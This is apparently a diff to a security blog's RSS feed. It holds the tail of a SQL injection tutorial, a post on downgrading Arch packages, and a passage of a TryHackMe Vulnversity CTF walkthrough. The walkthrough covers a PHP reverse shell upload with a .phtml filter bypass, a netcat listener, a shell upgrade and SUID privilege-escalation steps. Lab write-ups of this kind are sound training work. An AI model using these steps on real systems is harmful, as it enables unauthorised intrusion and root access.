+
+&lt;p&gt;This will bring entries which have id of &lt;strong&gt;1&lt;/strong&gt;, and means that web application vulnerable to SQLi, from now on you can do everything same as before
+to extract data the database.&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnweb---blind-sqli&quot;&gt;VULNWEB - BLIND SQLi&lt;/h2&gt;
+
+&lt;p&gt;As you remember this was the pseudo code for testphp.vulnweb.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT (some unknown column names) FROM listproducts WHERE cat=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;author&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Lets make some changes to think what would have happened if source code for testphp.vulnweb would be like following.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SELECT (some unknown column names) FROM listproducts WHERE cat=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error !!!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#for i in result:
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#    print(i.title)
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#    print(i.img)
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#    print(i.description)
+&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;#    print(i.author)
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Query succesfull !&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If this was the case, we could not see any result of the query on the screen, neither
+images nor titles etc. Also can not perform error based sqli due to exception handling added.How we can extract any data, even make sure there is a sql injection vulnerability when our eyes are blind ?
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+To be continued&lt;/p&gt;
+</description>
+        <pubDate>Wed, 13 Oct 2021 12:00:00 +0100</pubDate>
+        <link>http://localhost:4000/2021/10/13/sql-injection/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/10/13/sql-injection/</guid>
+        
+        <category>sql</category>
+        
+        <category>sql-injection</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Downgrading Broken Packages</title>
+        <description>&lt;p&gt;It is a small possibility, but not impossible, that you may have encountered
+with a broken package after updating your system, while using rolling release
+operating system. Packages pushed into the repositories without going under
+any superior control. For example, when new version of a package arrives,
+manjaro checks it in it’s containers, then push them into public repos. While
+it is quite a personal preference which approach is better for you, it is not the
+same for each operating system. So if you have a broken package, or you are not just
+not comfortable with newer version of the release you may wish to downgrade it. 
+In this post you will learn how to downgrade a package and ignore updates.&lt;/p&gt;
+
+&lt;p&gt;Download utility called &lt;strong&gt;downgrade&lt;/strong&gt; with your favorite package manager.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;yay &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; downgrade&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After installing it run&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;downgrade cmatrix&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It will prompt you to a selection screen between version just like that&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Available packages &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;community&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+   1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  cmatrix    2.0  1  remote
++  2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  cmatrix    2.0  2  remote
++  3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  cmatrix    2.0  2  /var/cache/pacman/pkg
+
+&lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;a package by number: &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Select which version of the program you wish to use than press enter.
+After that step, downgrade utility will ask you to whether you wish to
+add that program to ignorepackage list to prevent later updates or not.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;add cmatrix to IgnorePkg? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/N]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If you press &lt;strong&gt;y&lt;/strong&gt; in this step, the package wont be affected while doing
+system wide updates. However if you wish to change it back and update the
+software someday, you need to edit &lt;strong&gt;/etc/pacman.conf&lt;/strong&gt;. Go find &lt;strong&gt;IgnorePkg=&lt;/strong&gt;
+variable, and delete the package name there. You can also add other packages 
+here manually to disable updates for a spesific program.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 12 Oct 2021 00:59:00 +0100</pubDate>
+        <link>http://localhost:4000/2021/10/12/downgrading-broken-packages/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/10/12/downgrading-broken-packages/</guid>
+        
+        <category>arch-linux</category>
+        
+        <category>package-managers</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Tryhackme Vulnversity Ctf Writeup</title>
+        <description>&lt;p&gt;&lt;a href=&quot;https://www.tryhackme.com/room/vulnversity&quot;&gt;&lt;strong&gt;Solve Yourself »&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Vulnversity is a machine that combines reconnaissance, web attack vectors and privilege escalation methods together.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;1-enumeration&quot;&gt;1-Enumeration&lt;/h2&gt;
+&lt;p&gt;Let’s start with enumerating the host.I will use Network Mapper &lt;strong&gt;nmap&lt;/strong&gt; tool in order to scan and probe opened ports and active services to find my attack vector.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;SYN Stealth Scan (Half TCP Connect scan)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Probe open ports to determine service/version info&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-O&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Enable OS detection.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-T4&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;T{0-5} Set scan speed, higher is faster.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Scan all 65536 ports.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-oN&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Outputfile&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Full command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;machine IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; vulnversity.nmap&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln2.jpg&quot; alt=&quot;Desktop View&quot; /&gt;
+&lt;br /&gt;
+To create our attack vector.If you do your research and investigate whether one of these services have any vulnerabilities or not, you will return to your home empty handed.You can try anonymous login to FTP protocol, or try to make a SSH connection but you would fail just like I did.None of these services have any vulnerabilities that would put us in the target system.&lt;/p&gt;
+
+&lt;p&gt;Other than that &lt;strong&gt;“3333/tcp open  http   Apache httpd 2.4.18 ((Ubuntu))”&lt;/strong&gt; catches the eye, so lets start to investigate the webpage that the host is running on its port 3333.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln3.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+Fire up your browser and type &lt;strong&gt;{machine IP}:3333&lt;/strong&gt; to your address bar.You will see the webpage shown above.Nothing suspicious there, so lets start to extract the directories with the help of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; tool.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;dir -u&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;URL and the port where web server is running&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-w&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Wordlist that contains possible directory names&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Full command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;MachineIP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;:3333 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;&lt;strong&gt;Seclist’s Wordlist Pack »&lt;/strong&gt;&lt;/a&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln4.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+Let’s go for &lt;strong&gt;http://[IP]:3333/internal&lt;/strong&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln5.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+It seems like we’ve find our playground :) Website have got an upload functionality.
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;2-exploitation&quot;&gt;2-Exploitation&lt;/h2&gt;
+&lt;p&gt;First thing came into my mind was to upload a php reverse shell, so let’s try it out.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/krygeNNN/phpenumerate&quot;&gt;&lt;strong&gt;PHP Reverse Shell Script »&lt;/strong&gt;&lt;/a&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln6.jpg&quot; alt=&quot;Desktop View&quot; class=&quot;shadow normal&quot; style=&quot;max-width: 80%&quot; /&gt; &lt;br /&gt;
+Download the script by using &lt;strong&gt;curl&lt;/strong&gt;.However in order to make it work, we need to make some configurations in the script to make it work.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln7.jpg&quot; alt=&quot;Desktop View&quot; class=&quot;shadow normal&quot; style=&quot;max-width: 80%&quot; /&gt; &lt;br /&gt;
+Change &lt;strong&gt;$ip&lt;/strong&gt; to your own machines ip (tryhackme’s vpn tunnel) ,define the port as any random &lt;strong&gt;$port&lt;/strong&gt;.I’ve changed it to the 8888 while it was 1234 by default.&lt;/p&gt;
+
+&lt;p&gt;Configurations are all done ! Now, it is time for us to upload the reverse shell to the web server.&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln8.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+&lt;strong&gt;Note&lt;/strong&gt;:My machine shutted it down while creating this post, so I had to restart it. That is why the ip have changed, don’t worry :)&lt;/p&gt;
+
+&lt;p&gt;It seems like .php extension is not allowed.However ,php extension is not the only extension that we can use, we have got couple more.You can try all of them manually, but come on, let’s write a python script :)) 
+&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln9.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+&lt;a href=&quot;https://www.tryhackme.com/room/vulnversity&quot;&gt;&lt;strong&gt;Download the php bruter script »&lt;/strong&gt;&lt;/a&gt;
+Run it.
+&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln10.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+&lt;strong&gt;.phtml&lt;/strong&gt; is the working extension. Rename the payload, &lt;strong&gt;php_reverse_shell.php&lt;/strong&gt; into &lt;strong&gt;php_reverse_shell.phtml&lt;/strong&gt;, and than upload it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln11.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+Now we have successfully injected our reverse shell script.However we also need to listen incoming connections from the server.Therefore we will use Netcat (&lt;strong&gt;nc&lt;/strong&gt;) to listen to the port 8888, which we set in the script before.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Do not resolve hostnames via DNS&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-l&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Bind and listen for incoming connections&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Set verbosity level (can be used several times)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Specify source port to use&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Full command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc &lt;span class=&quot;nt&quot;&gt;-nvlp&lt;/span&gt; 8888&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln12.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+While listening to port 8888, we need to activate the script that we just uploaded.
+&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln13.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+Visit this URL » &lt;strong&gt;http://{machineIP}:3333/internals/uploads&lt;/strong&gt;, and than click to the reverse php 
+shell script that you have uploaded.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln14.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+Excellent, we are in !
+&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;3-flag-capturing-and-privilege-eseclation&quot;&gt;3-Flag Capturing and Privilege Eseclation&lt;/h2&gt;
+&lt;p&gt;Nevertheless, this shell is not stable righ now, we need to spawn a python shell.
+&lt;br /&gt;Run those in order:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln15.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;1-user-flag&quot;&gt;1-User Flag&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln16.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+In order to get root flag, we have to escalate our privileges, let’s search for SUID binaries.If you are not familiar with SUID executables, I recommend you to make your research, than come back, but basically, when you executing a SUID file, you are executing it with it’s owner’s permissions.We will use &lt;strong&gt;find&lt;/strong&gt; command to scan for those binaries.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;/&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Search from the root directory&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-type f&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Only search for files&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-user root&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Only find the files owned by root&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-perm -u=s&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Only find the files with SUID bit set&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;2&amp;gt;/dev/null&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Redirect all stderr outputs to device null&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Full command:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;find &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s 2&amp;gt;/dev/null&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln17.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
+Some of those binaries have set uid bit by default, however &lt;strong&gt;/bin/systemctl&lt;/strong&gt; should not have that SUID permission by default,so let’s search how we can exploit that.
+&lt;br /&gt;
+&lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;&lt;strong&gt;GTFOBins »&lt;/strong&gt;&lt;/a&gt;
+&lt;br /&gt;
+GTFOBins is a github project, and it is curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.Click the link given above and search fore &lt;strong&gt;systemctl&lt;/strong&gt;.
+&lt;img src=&quot;/assets/img/posts/tryhackme-vulnversity-ctf-writeup/vuln18.jpg&quot; alt=&quot;Desktop View&quot; style=&quot;max-width: 80%&quot; class=&quot;normal&quot; /&gt; 
+&lt;br /&gt;
